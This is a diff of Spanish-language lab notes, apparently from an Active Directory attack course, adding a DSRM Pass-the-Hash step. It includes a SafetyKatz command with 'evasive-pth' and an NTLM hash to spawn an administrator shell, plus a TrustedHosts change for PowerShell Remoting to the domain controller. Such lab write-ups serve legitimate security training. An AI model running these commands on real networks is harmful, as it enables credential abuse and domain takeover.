@@ -961,5 +961,13 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" 
 
 Ahora en nuestra maquian de estudiante podemos hacer un *Pass-The-Hash* para el administrador de *DSRM*
 ```shell
-[student9]
+[student97]
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
+```
+
+EL hash *NTLM* lo hemos obtenido antes a la hora de ejecutar el *SafetyKatz* en el *svcadmin*
+Desde el nuevo proceso que se nos crea ahora podemos acceder a *dcorp-dc*. Tenga en cuenta que estamos utilizando PowerShell Remoting con dirección IP y autenticación - *NegociateWithImplicitCredential*’, ya que estamos utilizando la autenticación NTLM. Por lo tanto deberemos de modificar *TrustedHosts* par ala maquina del atacante
+```shell
+[newCMD as admins privilege]
+Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
 ```
